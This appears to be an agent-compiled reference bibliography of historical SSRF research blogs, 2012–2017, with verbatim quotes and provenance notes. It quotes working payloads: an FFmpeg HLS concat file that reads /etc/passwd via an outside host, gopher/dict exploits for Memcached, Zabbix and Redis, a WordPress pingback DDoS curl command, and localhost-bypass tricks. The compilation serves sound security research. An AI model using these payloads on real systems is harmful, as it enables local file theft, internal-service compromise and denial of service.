---
title: "SSRF Vault — External Bibliography (era methodology blogs)"
type: reference
external_sources_read: 6
full_reads: 6
modern_layer_anchors: 1
harvest_source: "outbound links cited inside the corpus's own report bodies (no aggregator available)"
archive_accessed: "2026-10-24"
note: "The bugbountydaily links database used by the IDOR vault is no longer resolvable (NXDOMAIN at 1.1.1.1 as of 2026-10-24; zero Wayback captures of pyqacnwkytiyzciltgsal.supabase.co/rest/v1/*). This corpus was therefore harvested from the external sources the era reports themselves cite — every entry below names its citing case."
---

# External Bibliography (era methodology blogs)

## 0. Why this bibliography looks different from the other vaults'

The IDOR vault's blog corpus came from bugbountydaily's link database. That database
no longer exists (see frontmatter). Rather than inventing a replacement list, this
vault's bibliography is the set of external writings **the corpus reports themselves
cite and rely on** — recovered, fetched, and read in full on 2026-10-24. It is a
smaller but strictly more defensible corpus: every row has a named citing case, and
every quote is verbatim from the fetched text cached under
`/tmp/opencode/ssrf/blogs/`.

## 1. The corpus's external writings, era order

### BLOG-003 — "Cross Site Port Attacks - XSPA - Part 2" · Riyaz Ahemed Walikar (@bughunterrhapsody era) · November 13, 2012 · read in full (Wayback recovery)

- Era URL (now 404): `http://www.riyazwalikar.com/2012/11/cross-site-port-attacks-xspa-part-2.html` — recovered via Wayback Machine (web.archive.org, 2013 snapshot).
- Cited by: the **SSRF bible cheatsheet** (its References include part 2), and this is
  the provenance of the *XSPA* vocabulary the corpus titles use (`SRF-77817` "SSRF/XSPA
  в форме загрузки видео по URL"; the Yahoo/`#49474`-era grouping too).
- The era's own taxonomy — five XSPA attack classes, verbatim:
  > 1. Port Scanning remote Internet facing servers, intranet devices and the local web server itself. Banner grabbing is also possible in some cases.
  > 2. Exploiting vulnerable programs running on the Intranet or on the local web server
  > 3. Fingerprinting intranet web applications using standard application default files & behavior
  > 4. Attacking internal/external web applications that are vulnerable to GET parameter based vulnerabilities (SQLi via URL, parameter manipulation etc.)
  > 5. Reading local web server files using the file:/// protocol handler.
- The oracle-channel sentence that the whole Port-Scan category file builds on
  (verbatim):
  > If there is some parsing of data on the server then non HTML data may not be displayed, in such cases, unique error messages, response byte size and response timing can be used to identify port status providing an avenue for port scanning remote servers using the vulnerable web application.
- Intranet-application fingerprinting by default-file probes (verbatim; the era's own
  objective-ladder step that Internal-Service-Exposure.md collects the targets of):
  > Request: http://127.0.0.1:8080/phpMyAdmin/themes/original/img/b_tblimport.png
  > Request: http://127.0.0.1:8081/wp-content/themes/default/images/audio.jpg
  > Request: http://127.0.0.1:8082/profiles/minimal/translations/README.txt
- Era reality check, from the same page: the author demonstrated the Google Webmasters
  XSPA bug (verbatim: "Google has now fixed this issue (and my name was listed in the
  prestigious Google Hall of Fame for security researchers)"), and the series promise
  exists in two variants — the post body names "Facebook, Google, Mozilla, **Pinterest**,
  Adobe and Yahoo!" while Riyaz's reply comment promises "Facebook, Google, Mozilla,
  **Apigee**, Adobe and Yahoo!". Both quoted verbatim from the cached text.
- Cross-link beauty: a comment on this post preserves the provenance between the two era documents (verbatim):
  > Vladimir November 22, 2012 at 2:33 AM Added link to this technique of reading daemons to SSRF bible cheatsheet http://goo.gl/oRMhg Thx. But try to read related research before post ;)
  (commenter names are the blog's own; the comment describes adding the XSPA technique to the SSRF bible cheatsheet — BLOG-002 below — which indeed lists the XSPA series in its References.) Also note the comment by Prakhar Prasad (the `SRF-73567` author) — the era community was one pool.

### BLOG-001 — "Server Side Request Forgery Vulnerability" · Acunetix (Bogdan Calin) · August 15, 2013 · read in full (era version recovered via Wayback)

- Era URL: `http://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/` — cited by **SRF-50537** as footnote `[1]`.
- IMPORTANT fetch note: the live URL today serves a *different, rewritten* article
  ("What is server-side request forgery (SSRF)?", Invicti blog, Feb 3, 2022). The text
  below is quoted from the Wayback 2013–2016 era version only.
- Era definition, verbatim:
  > Server Side Request Forgery (SSRF) is a vulnerability that appears when an attacker has the ability to create requests from the vulnerable server.
- Era attack-set list, verbatim:
  > Scan and attack systems from the internal network that are not normally accessible
  > Enumerate and attack services that are running on these hosts
  > Exploit host-based authentication services
- Era `dict://` → local Memcached proof (verbatim; note the sic):
  > Depending on the vulnerable server, various attack vectors are available. For example, cURL has an extensive support of URL schemas other than HTTP/HTTPS. So, if the vulnerable server is using cURL to make HTTP requests, it's possible to use the dict URL schema to make requests to any host on any port and send custom data.
  > The URL dict://locahost:11211/stat will cause the server to connect to localhost on port 11211 and send the string "stat". Port 11211 is the default port used by Memcached. So, with this URL it's possible to connect to the local Memcached server and issue various commands. Normally, Memcached is not accessible from outside. Also, Memcached doesn't support any type of authentication and therefore the attacker can issue any type of command.
  *(sic — "locahost" appears in the source URL. The same typo recurs in the SSRF bible's Memcached exploit row, `dict://locahost:11211/stats` — a small lineage marker between the two documents.)*
- The ONSec pointer (verbatim):
  > The guys from ONSec Labs maintain a very detailed document with a lot of useful information about Server Side Request Forgery (SSRF) attacks.
- Detection (era scanner state, quoted verbatim):
  > When scanning a website, the scanner will inject various payloads that (if the server is vulnerable) will issue an HTTP request to the AcuMonitor server. After this, the scanner will contact AcuMonitor and confirm if such request was made. If so, an alert is issued.
- Alert content is callback-attribution evidence — the same IP + User-Agent channel the
  vault's Blind file codifies as SRF-236301's listener-log channel (verbatim):
  > The alert contains some information about the HTTP request that was performed: the IP address of the server that made this request and the User-agent used in the request.

### BLOG-006 — "More Than 162,000 WordPress Sites Used for Distributed Denial of Service Attack" · Sucuri (Daniel Cid) · March 10, 2014 · read in full

- URL: `https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html` — cited by **SRF-124097** ("More info: ...").
- The amplification mechanics (the SRF-124097 report is a per-target instance of this):
  > Any WordPress site with pingback enabled (which is on by default) can be used in DDOS attacks against other sites.
- Scale and traffic evidence, verbatim:
  > Just in the course of a few hours, over 162,000 different and legitimate WordPress sites tried to attack his site.
- The one-curl arming command (same XML skeleton as SRF-124097's payload, verbatim):
  > $ curl -D - "www.anywordpresssite.com/xmlrpc.php" -d '<methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://victim.com</string></value></param><param><value><string>www.anywordpresssite.com/postchosen</string></value></param></params></methodCall>'
  and the cache-buster mechanics: "all queries had a random value (like ` ?4137049=643182 `) that bypassed their cache and force a full page reload every single time".
- Mitigation (the filter fix and its era dilemma, verbatim):
  > add_filter( 'xmlrpc_methods', function( $methods ) { unset( $methods['pingback.ping'] ); return $methods; } );
  > This is a well known issue within WordPress and the core team is aware of it. It's not something that will be patched though. In many cases this same issue is categorized as a feature, one that many plugins use, so in therein lies the dilemma.
  *(sic — "so in therein lies"; in the source the dilemma paragraph directly follows the filter snippet.)*

### BLOG-004 — "Опасное видео: как я нашёл уязвимость в видеохостингах и не умер через 7 дней" · Habr (Mail.Ru company blog) · Maxim Andreev @cdump ("Dangerous video: how I found a vulnerability in video hostings and didn't die in 7 days") · January 12, 2016 · read in full

- URL (era): `https://habrahabr.ru/company/mailru/blog/274855/` — cited verbatim by
  **SRF-115857** ("Links to original report about this issue") and by the March oss-security record (BLOG-005). This is the **root publication of the FFmpeg family** — SRF-115857/115978/237381 are the HackerOne implementations of it.
- Author identity, verbatim (from the fetched page):
  > Я Максим Андреев, программист бэкенда Облака Mail.Ru. В свободное время я люблю искать баги.
  (gloss: "I am Maxim Andreev, backend programmer of Mail.Ru Cloud. In my free time I like hunting bugs.")
- The three-result claim the H1 cases mirror (verbatim):
  > можно получить на нём SSRF;
  > можно получить local file read;
  > если пользователь скачает этот файл, то автоматически будет подвержен уязвимостям, даже если его не откроет: можно будет получить доступ к данным на компьютере пользователя и узнать его имя.
  (gloss of the third clause: "if a user downloads this file, they are automatically affected even without opening it: one can get access to data on the user's computer and learn their name." This third clause — a CLIENT-side effect on a user who merely downloads the file — does not appear in any of the corpus H1 bodies. Note that.)
- Extension agnosticism (why the parser never needs a `.m3u8` name), verbatim:
  > Если попросить ffmpeg сконвертировать любой из этих файлов, то он без проблем всё выполнит, то есть он не обращает внимания на расширение файла.
  (gloss: "ask ffmpeg to convert any of these files and it will do it without a problem — it pays no attention to the file extension.")
- The response read-back upgrade (the `.txt`-suffix trick, verbatim):
  > А что, если мы к http url допишем в конце в GET-параметр .txt? Оказывается, ffmpeg подумает, что это текстовый файл и надо интерпретировать ответ как txt.
  (gloss: "What if we append .txt as a GET parameter to the http url? It turns out ffmpeg will think it is a text file and interpret the response as txt.") and the effect:
  > HTML-код из ответа проигрывается в полученном видео! То есть в данном случае мы получили возможность с помощью этой SSRF читать ответ на любые сетевые запросы.
  (gloss: "the HTML code from the response plays inside the resulting video! That is, in this case we got the ability to use this SSRF to read the response to any network request.")
- The full-file read method — verbatim workflow in the source's *own order* (the
  YUV4MPEG2 header is plain text read byte-per-pixel; the thumbnail decode turns the
  bytes back into the file's text):
  > файл header.y4m: YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono FRAME
  > ...
  > файл video.mp4: #EXTM3U #EXT-X-MEDIA-SEQUENCE:0 #EXTINF:10.0, concat:http://dx.su/header.y4m|file:///etc/passwd #EXT-X-ENDLIST
  > ffmpeg -i video.mp4 thumbnail.png
  > ...
  > ffmpeg -i thumbnail.png out.y4m
  > ...
  > файл out.y4m: YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono FRAME # $FreeBSD: release/10.0.0/etc/master.passwd 256366 ...
  > root:*:0:0:Charlie &:/root:/usr/local/bin/zsh
  (gloss: "file header.y4m:", "file video.mp4:", "file out.y4m:" — the elided parts are
  the note "thumbnail.png", the lead-in "А теперь полученный thumbnail декодируем обратно"
  = "now we decode the obtained thumbnail back", the source's continued passwd lines and
  a trailing ellipsis.) Also from the earlier first-line-steal example in the same post,
  verbatim outcome: the rendered preview showed
  > http://example.org?# $FreeBSD: release/10.0.0/et..
  i.e. the first local-file line ends up inside a URL of the attacker's choosing.
- Remediation (UPD section) — stronger than any single H1 case proposed, verbatim list
  *including its intervening annotation*:
  > Запускать ffmpeg в изолированном окружении (в chroot или в контейнере) - обязательно, учитывая, что ffmpeg потенциально содержит много уязвимостей, независимо от описанной в данной статье проблемы (см. googleonlinesecurity.blogspot.ru/2014/01/ffmpeg-and-thousand-fixes.html ). Запускать ffmpeg внутри этого окружения из-под отдельного пользователя с доступом на запись/чтение только туда, куда нужно. Отключить (--disable-network в configure) или ограничить (в iptables можно делать правила по uid'у пользователя) доступ к сети ffmpeg'у, если полное отключение невозможно.
  (gloss: run ffmpeg isolated in chroot/container — **required**, as ffmpeg potentially
  contains many vulnerabilities beyond this article's — see the Google Online Security
  "ffmpeg and thousand fixes" post; run it as a separate restricted user; disable
  `--disable-network` at configure or firewall by uid.) And:
  > Разработчики ffmpeg/libav уведомлены о проблеме, я сделал и отправил им патч.
  (gloss: "The ffmpeg/libav developers were notified; I made and sent them a patch.")

### BLOG-005 — "Re: Fwd: FFmpeg: stealing local files with HLS+concat" · oss-security (CVE assignment team, MITRE) · January 14, 2016 · read in full

- URL: `http://www.openwall.com/lists/oss-security/2016/01/14/1` — cited verbatim by **SRF-115857**.
- CVE assignment for the family (the corpus reported against Imgur/WordPress.com without
  CVEs; this is the numbering record):
  > Use CVE-2016-1897 for the concat issue (which is fully described in the blog/274855 reference) and CVE-2016-1898 for the subfile issue (which is mentioned but not described in the blog/274855 reference).
- The essence judgment (verbatim):
  > The essential problem is that a crafted file forces the victim to visit an arbitrary external URL, but this URL is constructed using data from the victim's local filesystem.
- The triage nuance worth citing in modern reports (verbatim) — MITRE's view was
  *site-specific* rather than a product bug, and Imgur still paid $800/$1,000 era
  amounts:
  > Similarly, the reports of FFmpeg SSRF in blog/274855 might be better modeled as site-specific vulnerabilities within the "online video conversion" web application.

### BLOG-002 — "SSRF bible. Cheatsheet" · Wallarm research team (@d0znpp / @Wallarm) · Revision 1.03, 26 January 2017 · read in full

- Era URL: `https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit` — cited verbatim by **SRF-14127** ("Good writeup about ssrf vulns:") and independently confirmed by BLOG-001's sentence ("The guys from ONSec Labs maintain a very detailed document ..."). The live URL serves **Revision 1.03, 26 Jan 2017** (fetched 2026-10-24 via the doc's `mobilebasic` view, 211KB extracted text); the exact revision SRF-14127 cited in 2014 is not recoverable from the URL — **not disclosed in the source**. All quotes below are pinned to rev 1.03's text; the vault does not claim the 2014 edition's wording.
- The era's complete scheme-matrix. Doc heading verbatim: `URL schema support PHP Java cURL LWP ASP.NET` — and the rows below follow that column order (the `mobilebasic` view flattens the table row-wise, so each line is name + 5 columns). The four rows the corpus actively demonstrates:
  > gopher enable by --with-curlwrappers before last patches w/o \0 char + ASP.NET <=3 and Windows XP and Windows Server 2003 R2 and earlier only
  > tftp enable by --with-curlwrappers - w/o \0 char - -
  > ...
  > dict enable by --with-curlwrappers - + - -
  > ...
  > expect disabled by default - - - -
  (rows also cover http, https, ldap, ftp, ssh2, file, ogg, imap, pop3, mailto, smtp, telnet.)
- Attack steps — the era's own end-to-end run card, verbatim:
  > Scan internal network to determine internal infrastructure which you may access
  > Collect opened ports at localhost and other internal hosts which you want (basically by time-based determination)
  > Determine services/daemons on ports using wiki or daemons banners (if you may watch output)
  > Determine type of you SSRF combination: Direct socket access (such as this example )
  > ...
  > Compare available schemas and services/daemons protocols to find smuggling possibilities
  > Determine host-based auth daemons and try to exploit it
  *(sic — "type of you SSRF"; the elided middle holds the sub-bullets "Sockets client (such as java URI, cURL, LWP, others)" and the CRLF/URI-schema determination steps, quoted in the bypass section below when relevant.)*
- DNS pinning — the era's own domain-validation bypass recipe, verbatim:
  > To bypass domain validation you may simple use pinning technique. For example, define A or AAAA records on your DNS server to your subdomains into victim's intranet:
  with the re-resolution race spelled out — two DNS lookups (`validate_domain()` check vs `file_get_contents()` fetch), attacker forges the second answer. No full-body case in this corpus demonstrated the DNS-pinning variant; it is preserved as era lexicon.
- PHP `fsockopen()` port-parsing — no case in this corpus demonstrates it, preserved as era lexicon; sample rows verbatim: `localhost:11211` → 11211, `localhost:11211aaaa` → 11211, `localhost:+11211aaa` → 11211, `localhost:00011211aaaa` → 11211 — then an A/B/C/E fuzz-table of parser-tolerated byte values.
- Server-side POST-body theft (the era root of what the vault calls original-request-data sniffing), verbatim situation statement:
  > In many cases there are useful to sniff data of initial request using SSRF. Its may be OAuth tokens, basic auth credential, POST bodies and others.
  *(sic — "useful to sniff", "Its may be".)* The doc's own redirect table says server-side cURL keeps POST with statuses 300, 305, 306, 307 (LWP and PHP: none) — and for that the corpus case **SRF-204513** ( userinfo-credential relay via `press-this`) is the era instantiation. No corpus case demonstrates the POST-body-steal variant itself; preserved as era lexicon.
- The internal-service exploitation catalog (verbatim exploit formats, per service):
  > Exploits gopher://localhost:11211/1%0astats%0aquit dict://locahost:11211/stats ldap://localhost:11211/%0astats%0aquit
  for Memcached — and its Markdown origin context: 'Exploitation steps: collect all keys / determine interesting keys / replace key's values to arbitrary' with techniques of injecting into HTML templates (login sniffer), dynamic templates (RCE), sessions (privilege escalation), and session creation with long expiry + admin privileges.
  For Zabbix agentd — verbatim precondition note:
  > Sometimes agentd configured to run arbitrary commands from servers (item system.ru used to run commands from key argument): EnableRemoteCommands=1
  *(sic — "system.ru" for `system.run`.)* then Exploits `gopher://localhost:10050/1vfs.file.regexp[/etc/hosts,7]` and `gopher://localhost:10050/1system.run[ls]`.
  For Postgres dblink, verbatim:
  > SELECT dblink_send_query('host=127.0.0.1 dbname=quit user=\' \nstats\n \' password=1 port=11211 sslmode=disable','select version();');
  For MongoDB, verbatim: `db.copyDatabase(" \1\2\3\4\5\6\7 ",'test','localhost:8000')` (with the hexdump capture shown) and `db.copyDatabase("\nstats\nquit",'test','localhost:11211')` for memcached.
  For Redis, verbatim commands: `SLAVEOF host port` and `MIGRATE host port key … (MIGRATE 192.168.1.34 6379 "" 0 5000 KEYS key1 key2 key3)` plus `CONFIG SET ...`.
  And the plugin-replication CouchDB pivot, verbatim:
  > POST http://couchdb:5984/_replicate ... { "source" : "recipes", "target" : "http://ssrf-me:11211/recipes", }
  (Internal-Service-Exposure.md's solved cases — Shopify's Zookeeper/Splunk/CouchDB-adjacent findings — are per-target instances of exactly this catalog years later.)
- The FFmpeg section — verbatim workflow including the two-step decode that the technique actually requires:
  > $ cat video.mp4
  > #EXTM3U
  > #EXT-X-MEDIA-SEQUENCE:0
  > #EXTINF:10.0,
  > concat:http://example.org/header.y4m|file:///etc/passwd
  > #EXT-X-ENDLIST
  > $ ffmpeg -i video.mp4 thumbnail.png
  > $ ffmpeg -i thumbnail.png out.y4m
  > $ cat out.y4m
  > YUV4MPEG2 W30 H30 F25:1 Ip A0:0 Cmono FRAME # $FreeBSD: release/10.0.0/etc/master.passwd 256366 ... root:*:0:0:Charlie &:/root:/usr/local/bin/zsh toor:*:0:0:Bourne-again Superuser:/root:
  > Original link: https://bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367
- Downstream references preserved (era list, all cited inside the source doc): Polyakov's Black Hat 2012 "SSRF Business" slides, "SSRF + Java + Windows = Love" SMBRelay research, **the XSPA series (BLOG-003 — the exact URL quoted in the doc's Researches list)**, `/usr/share/nmap/nmap-service-probes` (protocol fingerprinting by time), Sullivan's BH-US-11 server-side paper, *The Tangled Web* chapter.

## 2. Modern-layer anchor (distinct era-branch, clearly not from the archive)

### MODERN-1 — "Server-side request forgery (SSRF)" · PortSwigger Web Security Academy · fetched 2026-10-24 · read in full

- URL: `https://portswigger.net/web-security/ssrf`. Used by the vault as the
  modernization layer only (the corpus predates the academy). Modern statements the
  agent playbooks build on (all quoted verbatim from the fetched page):
- Modern impact statement:
  > In some situations, the SSRF vulnerability might allow an attacker to perform arbitrary command execution.
- Modern bypass table, blacklist first — the two boxed techniques quoted as separate
  list items, verbatim:
  > Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1.
  followed by:
  > Register your own domain name that resolves to 127.0.0.1. You can use spoofed.burpcollaborator.net for this purpose.
- Whitelist-vs-parser inconsistency bypass (the modern formalization of the corpus's
  userinfo trick in SRF-204513, verbatim):
  > You can embed credentials in a URL before the hostname, using the @ character. For example: `https://[REDACTED_CREDS]@evil-host`
- Hidden surface list (verbatim): partial URLs, "URLs within data formats" (XXE→SSRF
  family), and the Referer-header analytics fetcher ("*As a result, the Referer header
  is often a useful attack surface for SSRF vulnerabilities.*").
- Blind-SSRF OOB definition:
  > Blind SSRF is harder to exploit but sometimes leads to full remote code execution on the server or other back-end components.
- The linked modern cheatsheet ("URL validation bypass cheat sheet") exists as a child
  page of the same academy section; content not fetched in this pass.

## 3. Cited-but-not-read technical references (list-only, from corpus bodies)

| Ref | Cited by | Use |
| --- | --- | --- |
| `docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html` | SRF-53088 | era AWS metadata doc |
| `docs.openstack.org/admin-guide-cloud/content/section_metadata-service.html` | SRF-53088 | era OpenStack metadata doc |
| `secure.phabricator.com/T6755` | SRF-53088 | upstream Phabricator ticket ("Won't fix") |
| `www.ffmpeg.org/ffmpeg-protocols.html#concat` / `#subfile` | SRF-115857 | parser feature documentation |
| `bugs.launchpad.net/ubuntu/+source/ffmpeg/+bug/1533367` | BLOG-002 (bible) | upstream public bug (family) |
| 9447 CTF 2015 "super-turbo-atomic-gif-converter" write-up | BLOG-005 (oss-security) | CTF-era family root |
| `curl.haxx.se/libcurl/c/libcurl-errors.html` | SRF-50537 | cURL error-code table (the differencing channels) |

## 4. Honest boundary of this bibliography

1. Six era sources read in full + one modern page. No further rows invented; nothing
   from the dead bugbountydaily database could be listed except by name, and even that
   list (published links table) is unretrievable today — *not disclosed in the source*
   is the right answer here, not a fabricated roster.
2. Google-Doc revision drift: SRF-14127 cited the document in 2014; the live document
   is rev 1.03 (Jan 2017). Every quotes above are pinned to rev 1.03 and stated as
   such; the vault does not claim the 2014 edition's wording.
3. Acunetix URL drift: era quote comes from the Wayback 2013–2016 capture; the
   same URL today holds a 2022 rewrite (Invicti). Both are labeled.
4. The rss/medium class of the era (no SSRF-era essay in this set) was not reachable
   from the corpus's own citations — the corpus's outbound citation graph is the
   boundary of this bibliography.
